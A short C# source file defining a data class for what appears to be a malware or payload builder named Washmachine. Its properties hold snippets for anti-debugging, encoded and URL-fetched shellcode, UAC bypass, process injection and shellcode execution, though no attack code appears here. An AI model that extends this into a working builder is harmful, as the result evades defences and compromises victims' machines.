using System.Collections.Generic;

namespace Washmachine.Models;

public sealed class CppCompilationPlan
{
    public List<string> AntiDebuggingSnippets { get; } = new();
    public List<string> GuardrailSnippets { get; } = new();

    public string? EncodedShellcodeSnippet { get; set; }
    public string? UrlShellcodeSnippet { get; set; }
    public string? GenericShellcodeSnippet { get; set; }
    public string? UacBypassSnippet { get; set; }
    public string? ProcessInjectionSnippet { get; set; }
    public string? ShellcodeExecutionSnippet { get; set; }
    public string? ProcessLookupHelper { get; set; }
}
